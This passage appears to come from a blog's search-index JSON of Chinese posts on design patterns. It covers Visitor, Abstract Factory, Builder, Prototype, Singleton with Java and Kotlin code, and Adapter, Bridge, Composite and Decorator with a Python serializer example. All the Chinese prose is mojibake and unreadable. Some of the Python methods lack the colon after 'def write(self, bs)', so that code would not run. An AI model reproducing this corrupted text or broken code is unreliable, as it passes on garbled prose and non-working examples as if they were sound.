ä¸€ä¸ªç±»å³å¯ã€‚è¿™ä½¿å¾—åœ¨æ–°å¢ä¸€é¡¹å¯¹æ–‡æ¡£æ¨¡å‹çš„æ“ä½œæ—¶ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿåšåˆ°äº†â€œå¯¹ä¿®æ”¹å…³é—­ï¼Œå¯¹æ‰©å±•å¼€æ”¾â€ï¼Œè€Œä¸”æ¯ä¸€é¡¹æ–°å¢åŠŸèƒ½éƒ½å¾ˆå¥½çš„å°è£…åœ¨äº†ç‹¬ç«‹çš„æ–°å¢ç±»å½“ä¸­ï¼Œè€Œä¸æ˜¯æ•£è½åœ¨æ–‡æ¡£ç»“æ„çš„å„ä¸ªå±‚æ¬¡çš„ç±»å½“ä¸­ã€‚\næˆ‘ä»¬çœ‹ä¸€ä¸‹ä½¿ç”¨è®¿é—®è€…æ¨¡å¼ä¹‹åçš„ç±»å›¾ï¼š\né€‚ç”¨æ€§ é€šè¿‡ä¸Šè¿°æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè¢«è®¿é—®çš„å¯¹è±¡å±‚çº§æœ¬èº«ä¸å¤ªç¨³å®šï¼ˆä¾‹å¦‚éšæ—¶å¯èƒ½æ·»åŠ ä¸€ç§æ–°çš„ Element ï¼‰ï¼Œé‚£ä¹ˆå¯èƒ½ä¸å¤ªé€‚åˆä½¿ç”¨ Visitor æ¨¡å¼ã€‚å› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šæ¶‰åŠå¯¹ Visitor ç»“æ„çš„ä¿®æ”¹ï¼ˆå¢åŠ æ–°çš„ visit æ–¹æ³•ï¼‰ï¼Œä»è€Œå¯¼è‡´ Visitor ç»§æ‰¿å±‚çº§çš„ä¸ç¨³å®šã€‚\nè¿™é‡Œéœ€è¦æƒè¡¡çš„æ˜¯ï¼Œå“ªé‡Œå‘ç”Ÿå˜åŒ–çš„å¯èƒ½æ€§æ¯”è¾ƒå¤§ï¼Ÿå¦‚æœå¯¹è±¡å±‚çº§æœ¬èº«å˜åŒ–çš„å¯èƒ½æ€§æ¯”è¾ƒå¤§ï¼Œåˆ™å¯èƒ½ä¸é€‚åˆä½¿ç”¨ Visitor æ¨¡å¼ï¼›å¦‚æœå¯¹è±¡å±‚çº§æœ¬èº«è¾ƒç¨³å®šï¼Œè€Œå¢åŠ ä¸€ç§æ–°çš„æ“ä½œçš„å¯èƒ½æ€§æ¯”è¾ƒå¤§ï¼Œåˆ™æ¯”è¾ƒé€‚åˆä½¿ç”¨ Visitor æ¨¡å¼ã€‚\nç›¸å…³æ¨¡å¼ ç»„åˆ (Composite): Visitor æ¨¡å¼å¯ä»¥æ­é… Composite æ¨¡å¼ä¸€èµ·ä½¿ç”¨ï¼Œç”¨æ¥å¯¹ä¸€ä¸ªé€šè¿‡ Composite æ¨¡å¼æ„å»ºçš„å¯¹è±¡å±‚æ¬¡ç»“æ„è¿›è¡Œéå†æ“ä½œã€‚ä¸Šè¿°çš„å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹æ¡ˆä¾‹ï¼Œå°±æ˜¯è¿™æ ·ä¸€ä¸ªä¾‹å­ã€‚ è§£é‡Šå™¨ (Interpreter): è®¿é—®è€…ä¹Ÿå¯ä»¥åœ¨è§£é‡Šå™¨æ¨¡å¼ä¸­ä½¿ç”¨ã€‚ ","description":"","tags":["design-pattern","architecture"],"title":"è®¾è®¡æ¨¡å¼ï¼šè¡Œä¸ºå‹ (Behavioral)","uri":"/posts/design-patterns-behavioral/"},{"categories":null,"content":"è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼šè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ã€‚\næŠ½è±¡å·¥å‚ (Abstract Factory) æ„å›¾ æä¾›ä¸€ä¸ªæ¥å£ä»¥åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–çš„å¯¹è±¡ï¼Œè€Œæ— é¡»æŒ‡å®šå®ƒä»¬å…·ä½“çš„ç±»ã€‚\næ¡ˆä¾‹ å‰é¢åœ¨ä¾èµ–å€’ç½®åŸåˆ™ä¸­ï¼Œå…¶å®å·²ç»ä¸¾è¿‡ä¸€ä¸ªè´´çº¸çš„ä¾‹å­ï¼Œå…¶å®å°±æ˜¯æŠ½è±¡å·¥å‚æ¨¡å¼çš„ä¸€ä¸ªåº”ç”¨ã€‚\né™¤äº†å¯¹ Product å’Œ Factory è¿›è¡ŒæŠ½è±¡ä»¥å¤–ï¼ŒæŠ½è±¡å·¥å‚æ–¹æ³•è¿˜å¼ºè°ƒäº†â€‹äº§å“ç³»åˆ—â€‹çš„æ¦‚å¿µã€‚æ¯”å¦‚ã€Šè®¾è®¡æ¨¡å¼ã€‹ä¸€ä¹¦ä¸­ç»å…¸çš„ä¾‹å­ï¼Œæ”¯æŒå¤šç§è§†æ„Ÿï¼ˆlook-and-feelï¼‰æ ‡å‡†çš„ç”¨æˆ·ç•Œé¢ï¼Œä¸åŒçš„è§†æ„Ÿé£æ ¼ä¸ºè¯¸å¦‚æ»šåŠ¨æ¡ã€çª—å£å’ŒæŒ‰é’®ç­‰ç”¨æˆ·ç•Œé¢ã€çª—å£ç»„ä»¶ã€å®šä¹‰ä¸åŒçš„å¤–è§‚å’Œè¡Œä¸ºã€‚è€ŒæŸä¸ªç‰¹å®šè§†æ„Ÿé£æ ¼ä¸‹çš„ä¸€ç³»åˆ—ã€çª—å£ç»„ä»¶ã€ï¼Œå°±æ˜¯ä¸€ä¸ªäº§å“ç³»åˆ—ã€‚æˆ‘ä»¬ä¸åº”è¯¥åœ¨ Motif é£æ ¼çš„çª—å£ç»„ä»¶ä¸­ï¼Œæ··å…¥ä¸€ä¸ª PM é£æ ¼çš„çª—å£ç»„ä»¶ã€‚\nè¿™é‡Œæˆ‘ä»¬éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š\nå¦‚ä½•ç¡®ä¿è½¯ä»¶ä¸ä¾èµ–æŸç§å…·ä½“çš„è§†æ„Ÿé£æ ¼ï¼Œä»¥ä¿è¯è½¯ä»¶çš„å¯ç§»æ¤æ€§ã€‚å°±åƒå‰é¢çš„æ¡ˆä¾‹ä¸­ï¼Œ Editor ä¸åº”è¯¥ç›´æ¥ä¾èµ–æŸä¸ªå…·ä½“çš„ StaticSticker ä¸€æ ·ï¼› å¦‚ä½•ç¡®ä¿æˆ‘ä»¬ä¸ä¼šåœ¨ Motif è§†æ„Ÿä¸­ï¼Œé”™è¯¯çš„ä½¿ç”¨äº†ä¸€ä¸ª PM é£æ ¼çš„ç»„ä»¶ï¼Ÿ æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ½è±¡å·¥å‚æ¨¡å¼ï¼Œä¼˜é›…åœ°è§£å†³ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜ã€‚çœ‹ä¸€ä¸‹ç±»å›¾å°±æ˜ç™½äº†ï¼š\næ¯ä¸€ç§è§†æ„Ÿæ ‡å‡†éƒ½å¯¹åº”ä¸€ä¸ªå…·ä½“çš„ WidgetFactory å­ç±»ï¼Œå®¢æˆ·åªéœ€è¦é€šè¿‡ WidgetFactory å³å¯åˆ›å»ºå‡ºä¸€ç»„ç‰¹å®šé£æ ¼çš„çª—å£ç»„ä»¶ï¼Œæ— éœ€å…³å¿ƒå“ªäº›ç±»å®ç°äº†ç‰¹å®šé£æ ¼çš„çª—å£ç»„ä»¶ï¼Œè€Œä¸”å¯ä»¥ä¿è¯ç»å¯¹ä¸ä¼šé”™è¯¯çš„æ··ç”¨ä¸åŒé£æ ¼çš„çª—å£ï¼Œå› ä¸º WidgetFactory å¼ºåŒ–äº†åŒä¸€ç±»å‹é£æ ¼ç»„ä»¶ä¹‹é—´çš„ç»‘å®šå…³ç³»ã€‚\né€‚ç”¨æ€§ ä¸€ä¸ªç³»ç»Ÿå¸Œæœ›ç‹¬ç«‹äºå®ƒçš„äº§å“çš„åˆ›å»ºã€ç»„åˆå’Œå®ç°ã€‚ ä¸€ä¸ªç³»ç»Ÿå­˜åœ¨å¤šä¸ªäº§å“ç³»åˆ—ï¼Œåœ¨å·¥ä½œæ—¶éœ€è¦é€‰æ‹©å…¶ä¸­ä¸€ä¸ªäº§å“ç³»åˆ—æ¥ä½¿ç”¨ã€‚ æ¯”è¾ƒå¼ºè°ƒäº§å“ç³»åˆ—çš„æ¦‚å¿µï¼ŒåŒä¸€ä¸ªç³»åˆ—çš„äº§å“åº”è¯¥é…åˆåœ¨å¼•èµ·ä½¿ç”¨ï¼Œä¸åŒç³»åˆ—çš„äº§å“ä¸èƒ½æ··ç”¨ã€‚ æä¾›ä¸€ä¸ªäº§å“ç±»åº“ï¼Œä½†åªæƒ³æš´éœ²å®ƒä»¬çš„æ¥å£è€Œä¸æ˜¯å®ç°ã€‚ ä¼˜ç‚¹ å®ƒåˆ†ç¦»äº†å…·ä½“å®ç°ç±» æ›¿æ¢äº§å“ç³»åˆ—å˜å¾—ååˆ†ç®€å•ï¼Œåªéœ€æ›¿æ¢ä¸€ä¸ª factory å³å¯ æœ‰åˆ©äºäº§å“çš„ä¸€è‡´æ€§ï¼Œå¯ä»¥è‡ªåŠ¨ç¡®ä¿ä¸åŒç³»åˆ—çš„äº§å“ä¹‹é—´ä¸ä¼šæ··ç”¨ ç¼ºç‚¹ è¯¥æ¨¡å¼å¯ä»¥å¾ˆè½»æ˜“çš„æ‰©å±•æ–°çš„äº§å“ç³»åˆ—ï¼Œä½†å¦‚æœè¦æ‰©å±•äº§å“ç³»åˆ—ä¸­çš„äº§å“ç±»å‹ï¼Œä¾‹å¦‚ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œå¢åŠ ä¸€ç§æ–°çš„çª—å£ç»„ä»¶ï¼Œä¼šæ¯”è¾ƒå›°éš¾ï¼Œå› ä¸ºä¼šæ¶‰åŠ AbstractFactory ç±»åŠå…¶æ‰€æœ‰å­ç±»çš„ä¿®æ”¹ã€‚\nå› æ­¤ï¼Œä½¿ç”¨è¯¥æ¨¡å¼æœ€å¥½ä¸€å¼€å§‹å°±è€ƒè™‘æ¸…æ¥šç³»ç»Ÿä¸­æœ‰å“ªäº›äº§å“ç±»å‹ï¼Œæ˜¯å¦ç›¸å¯¹ç¨³å®šï¼Œå¦åˆ™ä¸å¤ªå»ºè®®ä½¿ç”¨ã€‚\nç›¸å…³æ¨¡å¼ AbstractFactory ç±»é€šå¸¸ç”¨å·¥å‚æ–¹æ³• (Factory Method)æ¥å®ç°ï¼Œä¹Ÿå¯ä»¥ç”¨åŸå‹(Prototype) æ¥å®ç°ã€‚\nä¸€ä¸ªå…·ä½“çš„å·¥å‚å¯ä»¥ä½œä¸ºä¸€ä¸ªå•ä¾‹ (Singleton) å­˜åœ¨ã€‚\nå·¥å‚æ–¹æ³• (Factory Method) æ„å›¾ å®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å­ç±»å†³å®šå…·ä½“å°†åˆ›å»ºå“ªä¸€ç§ç±»å‹çš„å®ä¾‹ï¼Œå³å¯¹è±¡çš„å®ä¾‹åŒ–è¿‡ç¨‹è¢«å»¶è¿Ÿåˆ°å­ç±»è¿›è¡Œã€‚\nå·¥å‚æ–¹æ³•ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œå…¶å®åœ¨Abstract Factory æŠ½è±¡å·¥å‚ä¸­å°±æœ‰å·¥å‚æ–¹æ³•çš„è¿ç”¨ã€‚\nç±»å›¾ ç”Ÿæˆå™¨ (Builder) æ„å›¾ å°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å®ƒçš„å†…éƒ¨è¡¨ç¤ºç›¸åˆ†ç¦»ï¼Œä½¿å¾—äºŒè€…å¯ä»¥ç‹¬ç«‹å‘ç”Ÿå˜åŒ–ã€‚\nè¿™é‡Œæœ‰ä¸¤å±‚å«ä¹‰ï¼š\næ„å»ºè¿‡ç¨‹ï¼ˆDirectorï¼‰å’Œå†…éƒ¨è¡¨ç¤ºï¼ˆBuilderï¼‰ç›¸åˆ†ç¦»ã€‚åŒæ ·çš„æ„å»ºè¿‡ç¨‹ï¼Œå¯ä»¥ç”Ÿæˆä¸åŒçš„ç»“æœã€‚ä¾‹å¦‚ï¼Œâ€œè§£æå¹¶éå† RTF æ–‡æ¡£ç»“æ„â€è¿™ä¸ªè¿‡ç¨‹æ˜¯å¯å¤ç”¨çš„ï¼Œä½†æ˜¯æˆ‘åˆ©ç”¨ä¸åŒçš„ Builder, æœ€ç»ˆå¯ä»¥æ„å»ºå‡ºä¸åŒæ ¼å¼çš„æ–‡æ¡£ï¼ˆ Markdown, Html, Text ç­‰ï¼‰ã€‚ æ„å»ºè¿‡ç¨‹ä¸ç”¨å…³å¿ƒäº§å“çš„å†…éƒ¨ç»„æˆéƒ¨åˆ†æ˜¯å¦‚ä½•åˆ›å»ºçš„ï¼ˆå…·ä½“ç”±å“ªäº›ç±»å®ä¾‹åŒ–ï¼‰ï¼Œä»¥åŠè¿™äº›éƒ¨åˆ†æ˜¯å¦‚ä½•ç»„è£…çš„ã€‚å› æ­¤ï¼Œæ„å»ºè¿‡ç¨‹å¯ä»¥è¢«ç‹¬ç«‹ä¿®æ”¹ã€‚ ç»“æ„ ç±»å›¾ æ—¶åºå›¾ æ•ˆæœ å®ƒä½¿ä½ å¯ä»¥æ”¹å˜ä¸€ä¸ªäº§å“çš„å†…éƒ¨è¡¨ç¤º Builder å¯¹è±¡ä¸º Director æä¾›äº†ä¸€ä¸ªæ„é€ äº§å“çš„æŠ½è±¡æ¥å£ï¼Œè¯¥æ¥å£éšè—äº†è¿™ä¸ªäº§å“çš„è¡¨ç¤ºå’Œå†…éƒ¨ç»“æ„ï¼ŒåŒæ—¶ä¹Ÿéšè—äº†è¯¥äº§å“æ˜¯å¦‚ä½•è£…é…çš„ã€‚å› æ­¤ï¼Œå½“ä½ æ”¹å˜è¯¥äº§å“çš„å†…éƒ¨è¡¨ç¤ºæ—¶ï¼Œåªéœ€æ›¿æ¢ä¸€ä¸ª Builder å³å¯ã€‚\nå®ƒä½¿ä½ å¯ä»¥åœ¨ä¸åŒçš„ Director ä¸­å¤ç”¨åŒä¸€ä¸ª Builder ä¾‹å¦‚ï¼Œä½ å¯ä»¥åœ¨ä¸åŒçš„ RTF æ–‡æ¡£æ ¼å¼ä¸­ï¼Œå¤ç”¨åŒä¸€ä¸ª MarkdownBuilder ã€‚\nå®ƒä½¿ä½ å¯¹æ„é€ è¿‡ç¨‹å¯ä»¥è¿›è¡Œæ›´ç²¾ç»†çš„æ§åˆ¶ Builder æ¨¡å¼å’Œå…¶ä»–åˆ›å»ºå‹æ¨¡å¼å¾ˆå¤§çš„ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œ Builder æ¨¡å¼ä¸æ˜¯è°ƒç”¨ä¸€ä¸ªæ¥å£ä¸€ä¸‹å­å°±ç”Ÿæˆäº§å“çš„ï¼Œè€Œæ˜¯é€šè¿‡å¯¼å‘å™¨ä¸€æ­¥ä¸€æ­¥æ„é€ ï¼Œè¿™ä¸ªè¿‡ç¨‹å…è®¸ä½ æœ‰æ›´é«˜çš„è‡ªç”±åº¦æ¥å®šåˆ¶æ•´ä¸ªäº§å“ã€‚\nç›¸å…³æ¨¡å¼ æŠ½è±¡å·¥å‚ (Abstract Factory) Abstract Factory ä¸ Builder çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼ŒBuilder æ¨¡å¼ç€é‡äºä¸€æ­¥æ­¥æ„é€ ä¸€ä¸ªå¤æ‚å¯¹è±¡ã€‚è€Œ Abstract Factory ç€é‡äºå¤šä¸ªç³»åˆ—çš„äº§å“å¯¹è±¡ã€‚å¦å¤–ï¼ŒBuilder åœ¨æœ€åä¸€æ­¥è¿”å›äº§å“ï¼Œè€Œ Abstract Factory ä¼šç«‹å³è¿”å›äº§å“ã€‚\nè®¿é—®è€… (Visitor) è¿™ä¸¤ä¸ªæ¨¡å¼åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ç«äº‰å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ª RTF æ¥è¯´ï¼Œæ—¢å¯ä»¥ç”¨ Visitor æ¨¡å¼æ¥éå†å¹¶å¯¼å‡ºä¸åŒæ ¼å¼çš„æ–‡æ¡£ï¼ˆå‚è€ƒæ¡ˆä¾‹ï¼šå¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹ï¼‰ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨ Director + ä¸åŒ Builder çš„æ–¹å¼æ¥å¯¼å‡ºä¸åŒæ ¼å¼çš„æ–‡æ¡£ã€‚å–å†³äºä½ çš„æ–‡æ¡£æ¨¡å‹æ˜¯å¦é€‚åˆé‡‡ç”¨ Visitor æ¨¡å¼ã€‚Visitor æ¨¡å¼æ˜¯ä¸€ç§æ›´åŠ é€šç”¨çš„ä¸ºæŸä¸€ç±»é›†åˆå…ƒç´ å¢åŠ ä¸åŒæ“ä½œçš„æ–¹æ³•ï¼Œå…¶ç›®çš„å¹¶éè¦æ„é€ å¯¹è±¡ã€‚\nåŸå‹ (Prototype) æ„å›¾ é€šè¿‡å…‹éš†åŸå‹å®ä¾‹çš„æ–¹å¼æ¥åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚\nç±»å›¾ æ•ˆæœ Prototype å…·å¤‡å¾ˆå¤šä¸å…¶ä»–åˆ›å»ºå‹æ¨¡å¼ï¼ˆä¾‹å¦‚ æŠ½è±¡å·¥å‚ï¼‰ç±»ä¼¼çš„æ•ˆæœï¼Œæ¯”å¦‚å®ƒå¯¹å®¢æˆ·éšè—äº†å…·ä½“çš„äº§å“ç±»ï¼Œå› æ­¤å‡å°‘äº†å®¢æˆ·çŸ¥é“çš„åå­—çš„æ•°ç›®ï¼Œè€Œä¸”è®©å®¢æˆ·æ— éœ€ä¿®æ”¹å³å¯åˆ‡æ¢åˆ°ä¸åŒçš„å…·ä½“äº§å“ã€‚\né™¤æ­¤ä¹‹å¤–ï¼ŒPrototype æœ‰ä¸€äº›ç‹¬æœ‰çš„ç‰¹ç‚¹ï¼Œä¸‹é¢åˆ—ä¸¾ä¸€äº›ã€‚\nè¿è¡Œæ—¶å¢åŠ å’Œåˆ é™¤äº§å“ Prototype å¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨è¿è¡Œæ—¶é€šè¿‡æ³¨å†ŒåŸå‹å®ä¾‹æ¥å¢åŠ ä¸€ä¸ªæ–°çš„å…·ä½“äº§å“ï¼Œè¿™æ¯”æŠ½è±¡å·¥å‚æ¨¡å¼ç›¸å¯¹ä¼šçµæ´»ä¸€äº›ã€‚\nå‡å°‘å­ç±»æ•°é‡ ä½¿ç”¨æŠ½è±¡å·¥å‚ä¼šäº§ç”Ÿä¸€ä¸ªä¸äº§å“ç±»å±‚æ¬¡å¹³è¡Œçš„ Factory ç±»å±‚æ¬¡ï¼Œè€Œ Prototype ä¸éœ€è¦ã€‚\nå•ä¾‹ (Singleton) æ„å›¾ ä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚\nå®ç° é¥¿æ±‰å¼ Java å®ç°\n1 2 3 4 5 6 7 8 9 10 class Singleton { public static Singleton getInstance() { return instance; } // ... private Singleton() {} private static Singleton instance = new Singleton(); } Kotlin å®ç°\n1 2 3 object Singleton { // ... } åŒé‡æ£€æŸ¥é” (Double-checked locking) Java å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Singleton { public static Singleton getInstance() { if (instance == null) { synchronized (Singleton.class) { if (instance == null) { instance = new Singleton(); } } } return instance; } private Singleton() {} private volatile static Singleton instance; } Kotlin å®ç°\n1 2 3 4 5 6 7 class Singleton private constructor() { companion object { val instance: Singleton by lazy(mode = LazyThreadSafetyMode.SYNCHRONIZED) { Singleton() } } } é™æ€å†…éƒ¨ç±» è¿™ç§æ–¹å¼åˆ©ç”¨ Java è™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶æ¥å®ç°æ‡’åŠ è½½çš„æ•ˆæœï¼Œå¹¶å¤„ç†åŒæ­¥é”çš„é—®é¢˜ã€‚\nJava å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Singleton { public static Singleton getInstance() { return Holder.instance; } public static void hello() { System.out.println(\"hello\"); } static { System.out.println(\"Singleton has been loaded!\"); } private Singleton() {} private static class Holder { static { System.out.println(\"Holder has been loaded!\"); } static final Singleton instance = new Singleton(); } public static void main(String[] args) { Singleton.hello(); // ä¸‹é¢è¿™å¥ä¼šè§¦å‘ Holder çš„åŠ è½½ï¼Œè¿›è€Œè§¦å‘ instance çš„åˆå§‹åŒ– Singleton.getInstance(); } } Kotlin å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Singleton private constructor() { companion object { init { println(\"Singleton has been loaded!\") } val instance get() = Holder.instance fun hello() { println(\"hello\") } } private object Holder { init { println(\"Holder has been loaded!\") } val instance = Singleton() } } Singleton.hello() // ä¸‹é¢è¿™å¥ä¼šè§¦å‘ Holder çš„åŠ è½½ï¼Œè¿›è€Œè§¦å‘ instance çš„åˆå§‹åŒ– Singleton.instance åŠ£åŠ¿ ä»å¯æµ‹è¯•æ€§çš„è§’åº¦ï¼Œåº”è¯¥å°½é‡å‡å°‘ Singleton çš„ä½¿ç”¨ã€‚å› ä¸º Singleton éš¾ä»¥è¢« mockã€‚å¯ä»¥è€ƒè™‘ç”¨æŠ½è±¡å·¥å‚ (Abstract Factory)æ¥ä»£æ›¿ Singleton, å¹¶åœ¨å·¥å‚å†…éƒ¨è¿”å›å…¶å”¯ä¸€å®ä¾‹ã€‚ ç”±äºå•ä¾‹å¯¹è±¡æ— æ³•è¢«åƒåœ¾å›æ”¶ï¼Œä¼šå¯¼è‡´éƒ¨åˆ†å†…å­˜æˆ–å…¶ä»–èµ„æºé•¿æœŸè¢«å æ®ã€‚å¦‚æœå•ä¾‹æ˜¯ä¸€ä¸ªå ç”¨è¾ƒå¤šèµ„æºçš„å¤æ‚å¯¹è±¡ï¼Œè¿™å¯èƒ½ä¼šé€ æˆèµ„æºç´§å¼ çš„é—®é¢˜ã€‚ ","description":"","tags":["design-pattern","architecture"],"title":"è®¾è®¡æ¨¡å¼ï¼šåˆ›å»ºå‹ (Creational)","uri":"/posts/design-patterns-creational/"},{"categories":null,"content":"è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼šè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ã€‚\né€‚é…å™¨ (Adapter) æ„å›¾ å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ï¼Œä½¿å¾—åŸæœ¬ä¸å…¼å®¹çš„æ¨¡å—ä¹‹é—´å¯ä»¥ååŒå·¥ä½œã€‚\nç±»å›¾ ç›¸å…³æ¨¡å¼ å’Œ Bridge æ¡¥æ¥ æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯å‡ºå‘ç‚¹ä¸åŒï¼š\nBridge çš„ç›®çš„æ˜¯å°†æ¥å£éƒ¨åˆ†å’Œå®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä»è€Œå¯ä»¥å¯¹å®ƒä»¬è¾ƒä¸ºå®¹æ˜“ä¹Ÿç›¸å¯¹ç‹¬ç«‹åœ°åŠ ä»¥æ”¹å˜ã€‚ Adapter æ„å‘³ç€æ”¹å˜ä¸€ä¸ªå·²æœ‰å¯¹è±¡çš„æ¥å£ã€‚ Decorator è£…é¥°å™¨ åœ¨ä¸æ”¹å˜æ¥å£çš„æƒ…å†µä¸‹ï¼Œå¢å¼ºäº†å…¶ä»–å¯¹è±¡çš„åŠŸèƒ½ï¼Œå› æ­¤ Decorator å¯¹åº”ç”¨ç¨‹åºçš„é€æ˜æ€§æ¯”è¾ƒå¥½ï¼Œè€Œä¸”å¯ä»¥æ”¯æŒé€’å½’ç»„åˆã€‚\nProxy ä»£ç† åœ¨ä¸æ”¹å˜å®ƒçš„æ¥å£çš„æ¡ä»¶ä¸‹ï¼Œä¸ºå¦ä¸€ä¸ªå¯¹è±¡å®šä¹‰äº†ä¸€ä¸ªä»£ç†ã€‚\næ¡¥æ¥ (Bridge) æ„å›¾ å°†æŠ½è±¡éƒ¨åˆ†ä¸å®ƒçš„å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬å¯ä»¥ç‹¬ç«‹åœ°å˜åŒ–ã€‚\nç±»å›¾ ä¸Šå›¾ä¸­ Window å’Œ WindowImp ä¹‹é—´å°±æ˜¯ Bridge çš„å…³ç³»ã€‚\nç»„åˆ (Composite) æ„å›¾ å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºâ€œéƒ¨åˆ†ï¼æ•´ä½“â€çš„å±‚æ¬¡ç»“æ„ã€‚Composite ä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ã€‚\nç±»å›¾ è£…é¥°å™¨ (Decorator) æ„å›¾ åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼ˆåŠŸèƒ½ï¼‰ã€‚\nä¸‹é¢æˆ‘ä»¬ç»“åˆæ¡ˆä¾‹æ¥é˜è¿°ä¸€ä¸‹ã€‚\næ¡ˆä¾‹åˆ†æï¼šæŒä¹…åŒ–å·¥å…· æŒä¹…åŒ–å·¥å…· å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°æ®æŒä¹…åŒ–å·¥å…·ï¼Œå…¶åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯å†™å…¥æŒä¹…åŒ–æ•°æ®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # æŒä¹…åŒ–æ¥å£ class Serializer: def write(self, bs): pass def close(self): pass # åŸºäºæ–‡ä»¶çš„æŒä¹…åŒ–å®ç° class FileBackendSerializer(Serializer): def __init__(self, path): self._file = open(path, 'wb') def write(self, bs) self._file.write(bs) def close(self): self._file.close() # åŸºäºæœåŠ¡å™¨çš„æŒä¹…åŒ–å®ç° class ServerBackendSerializer(Serializer): def __init__(self, address): self._server = self._connect(address) def write(self, bs): self._server.send(bs) def close(self): self._server.disconnect() # ... å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå®¢æˆ·é€šè¿‡ Serializer æ¥å£æ¥ä½¿ç”¨è¯¥åŠŸèƒ½ï¼Œåº•å±‚å®ç°å¯èƒ½æ˜¯åŸºäºæ–‡ä»¶çš„ FileBackendSerializer, æˆ–è€…æ˜¯åŸºäºæœåŠ¡å™¨çš„ ServerBackendSerializer, å®¢æˆ·å¯ä»¥æ ¹æ®ä¸åŒæƒ…å†µé€‰ç”¨ä¸åŒçš„æŒä¹…åŒ–å®ç°ã€‚\næˆ‘ä»¬ç”»ä¸€ä¸‹ç±»å›¾ï¼š\nå¢åŠ  gzip å‹ç¼©åŠŸèƒ½ æŸä¸€å¤©ï¼Œæˆ‘ä»¬å‘ç°æŒä¹…åŒ–çš„æ•°æ®é‡è¶Šæ¥è¶Šå¤§ï¼Œå› æ­¤å¸Œæœ›èƒ½å¤Ÿç»™ä¸Šè¿°æŒä¹…åŒ–å·¥å…·å¢åŠ  gzip çš„æ”¯æŒï¼Œä»¥å‡å°‘ç£ç›˜ç©ºé—´å ç”¨ã€‚\nå½“æˆ‘ä»¬æƒ³ä¸ºä¸€ä¸ªç±»æ‰©å±•æŸæƒ³åŠŸèƒ½æ—¶ï¼Œä¸€ç§å¸¸è§çš„åšæ³•æ˜¯ä¸ºå…¶åˆ›å»ºä¸€ä¸ªå­ç±»ï¼Œå¹¶åœ¨å­ç±»ä¸­é‡å†™ä¸€äº›æ–¹æ³•ï¼Œæ¥æ·»åŠ ä¸€äº›é¢å¤–çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ª FileBackendSerializer çš„å­ç±» GzipFileBackendSerializer, æ¥ä¸ºæ–‡ä»¶æŒä¹…åŒ–ç±»å¢åŠ  gzip çš„åŠŸèƒ½ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import gzip # åŸºäºæ–‡ä»¶çš„æŒä¹…åŒ–å®ç°ï¼ŒåŒæ—¶æ”¯æŒ gzip å‹ç¼©åŠŸèƒ½ class GzipFileBackendSerializer(FileBackendSerializer): def __init__(self, path): self._file = open(path, 'wb') def write(self, bs) bs = gzip.compress(bs) self._file.write(bs) def close(self): self._file.close() ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸º ServerBackendSerializer å¢åŠ ä¸€ä¸ªå­ç±» GzipServerBackendSerializer, 